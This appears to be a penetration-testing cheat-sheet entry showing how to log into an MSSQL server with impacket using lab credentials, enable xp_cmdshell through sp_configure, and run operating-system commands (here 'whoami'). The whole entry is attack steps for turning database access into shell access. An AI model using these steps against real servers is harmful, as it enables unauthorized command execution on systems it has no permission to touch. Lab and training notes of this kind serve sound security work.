---
title: "MSSQL to Shell"
---

# MSSQL to Shell

MSSQL access via impacket with `xp_cmdshell` enabled for OS command execution. Requires valid credentials with sysadmin or equivalent permissions.

```shell
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
```
